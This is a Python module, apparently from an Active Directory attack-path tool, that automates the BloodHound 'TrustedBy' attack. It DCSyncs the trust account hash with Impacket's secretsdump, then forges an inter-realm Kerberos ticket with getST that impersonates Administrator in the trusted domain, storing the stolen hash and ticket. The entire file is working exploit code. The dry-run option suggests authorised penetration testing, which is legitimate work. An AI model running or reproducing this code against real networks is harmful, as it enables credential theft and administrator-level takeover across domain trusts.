"""Domain trust exploitation handler.

Exploits the ``TrustedBy`` BloodHound edge.  When Domain A trusts
Domain B (a ``TrustedBy`` edge from A to B), users from Domain B can
authenticate to resources in Domain A.

Attack flow:
    1. Verify Impacket tools are available and that the source principal
       has DCSync rights or a trust key has already been captured.
    2. If the trust key has not been captured, perform a DCSync to extract
       the trust account hash (``DOMAIN$``).
    3. Use ``getST.py`` or ``ticketer.py`` to forge an inter-realm TGT
       using the trust key.
    4. Use the TGT to access resources in the trusted domain.

Rollback:
    None -- this is an authentication-based attack with no AD modifications.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("TrustedBy")
class TrustedByHandler(BaseEdgeHandler):
    """Exploit ``TrustedBy`` edges via inter-realm trust key abuse.

    When Domain A trusts Domain B, the trust relationship is secured by
    a shared secret (trust key).  If we can obtain this key (via DCSync
    of the ``DOMAIN$`` trust account), we can forge inter-realm TGTs to
    access resources across the trust boundary.
    """

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        """Verify Impacket is available and DCSync or trust key access exists.

        Args:
            edge: The ``TrustedBy`` edge to evaluate.

        Returns:
            ``(ok, message)`` tuple.
        """
        # Check Impacket tools availability
        if not shutil.which("secretsdump.py"):
            return (
                False,
                "secretsdump.py not found on PATH. "
                "Install via: pip install impacket",
            )
        if not shutil.which("getST.py"):
            return (
                False,
                "getST.py not found on PATH. "
                "Install via: pip install impacket",
            )

        # Verify we have credentials for the source principal
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)

        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for '{source_user}'. "
                    "Need DCSync access or a pre-captured trust key.",
                )

        # Check if we already have the trust account hash
        target_domain = edge.target.properties.get("domain") or edge.target.domain
        trust_account = f"{target_domain.split('.')[0].upper()}$"
        trust_cred = self.cred_store.get_best_credential(trust_account, domain)

        if trust_cred is not None:
            return (
                True,
                f"Trust key already captured for '{trust_account}'. "
                "Ready to forge inter-realm TGT.",
            )

        return (
            True,
            f"Ready for TrustedBy exploitation: will DCSync to extract "
            f"trust key for '{trust_account}', then forge inter-realm TGT.",
        )

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        """Extract trust key and forge inter-realm TGT for cross-domain access.

        Args:
            edge: The ``TrustedBy`` edge.
            dry_run: If ``True``, log the planned actions without executing them.

        Returns:
            ``(success, message, new_credentials)`` tuple.
        """
        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        dc_host = self._get_dc_host()

        target_domain = edge.target.properties.get("domain") or edge.target.domain
        target_dc = edge.target.properties.get("dc_host") or dc_host
        trust_account = f"{target_domain.split('.')[0].upper()}$"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would extract trust key for '{trust_account}' via DCSync, "
                f"then forge inter-realm TGT from '{domain}' to '{target_domain}'.",
                [],
            )

        new_creds: list[Credential] = []

        # Step 1: Check if trust key is already captured
        trust_cred = self.cred_store.get_best_credential(trust_account, domain)
        trust_hash: str | None = None

        if trust_cred is not None and trust_cred.cred_type == CredentialType.nt_hash:
            trust_hash = trust_cred.value
            self.logger.info(
                "Using previously captured trust key for '%s'", trust_account,
            )
        else:
            # Step 1a: DCSync to extract the trust account hash
            self.logger.info(
                "TrustedBy Step 1: DCSync to extract trust key for '%s'",
                trust_account,
            )

            _target_str, auth_flags = self._get_impacket_auth(source_user)

            cred = self.cred_store.get_best_credential(source_user, domain)
            password = None
            nt_hash = None
            if cred:
                if cred.cred_type == CredentialType.password:
                    password = cred.value
                elif cred.cred_type == CredentialType.nt_hash:
                    nt_hash = cred.value
            else:
                password = self.config.credentials.password
                nt_hash = self.config.credentials.nt_hash

            result = await impacket.secretsdump(
                target=dc_host,
                auth_args=auth_flags,
                domain=domain,
                username=source_user,
                password=password,
                nt_hash=nt_hash,
                dc_ip=dc_host,
                just_dc=True,
                just_dc_user=trust_account,
                timeout=120,
            )

            if not result["success"]:
                return (
                    False,
                    f"DCSync for trust account '{trust_account}' failed: "
                    f"{result.get('error', 'unknown')}",
                    [],
                )

            hashes: dict[str, str] = result.get("hashes", {})

            # Look for the trust account hash (may appear with or without $)
            for key, val in hashes.items():
                if key.lower().rstrip("$") == trust_account.lower().rstrip("$"):
                    trust_hash = val
                    break

            if not trust_hash:
                return (
                    False,
                    f"DCSync succeeded but trust account hash for '{trust_account}' "
                    "not found in output.",
                    [],
                )

            # Store the trust key
            trust_key_cred = Credential(
                cred_type=CredentialType.nt_hash,
                value=trust_hash,
                username=trust_account,
                domain=domain,
                obtained_from=f"DCSync trust key extraction ({domain} -> {target_domain})",
            )
            new_creds.append(trust_key_cred)
            self.cred_store.add_credential(trust_key_cred)
            self.logger.info(
                "Captured trust key for '%s': %s...%s",
                trust_account, trust_hash[:4], trust_hash[-4:],
            )

        # Step 2: Forge inter-realm TGT using getST.py
        self.logger.info(
            "TrustedBy Step 2: Forging inter-realm TGT from '%s' to '%s'",
            domain, target_domain,
        )

        # Use getST.py with the trust account credentials to request
        # a service ticket in the target domain
        spn = f"krbtgt/{target_domain}"
        impersonate_user = "Administrator"

        trust_auth = impacket.build_impacket_auth(
            domain=domain,
            username=trust_account,
            nt_hash=trust_hash,
            dc_ip=dc_host,
        )
        st_result = await impacket.get_st(
            spn=spn,
            impersonate=impersonate_user,
            auth_args=trust_auth,
            domain=domain,
            username=trust_account,
            nt_hash=trust_hash,
            dc_ip=dc_host,
            timeout=60,
        )

        if not st_result["success"]:
            return (
                False,
                f"Inter-realm TGT forging failed: {st_result.get('error', 'unknown')}. "
                f"Trust key was captured successfully.",
                new_creds,
            )

        # Store the forged TGT
        ccache_file = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        ccache_cred = Credential(
            cred_type=CredentialType.ccache,
            value=ccache_file,
            username=impersonate_user,
            domain=target_domain,
            obtained_from=f"Inter-realm TGT via trust key ({domain} -> {target_domain})",
        )
        new_creds.append(ccache_cred)
        self.cred_store.add_credential(ccache_cred)

        self.logger.info(
            "Inter-realm TGT forged: %s can access resources in '%s'",
            impersonate_user, target_domain,
        )

        return (
            True,
            f"TrustedBy exploitation complete: forged inter-realm TGT for "
            f"'{impersonate_user}' from '{domain}' to '{target_domain}'.",
            new_creds,
        )

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """No rollback needed -- authentication-based, no AD changes."""
        return None
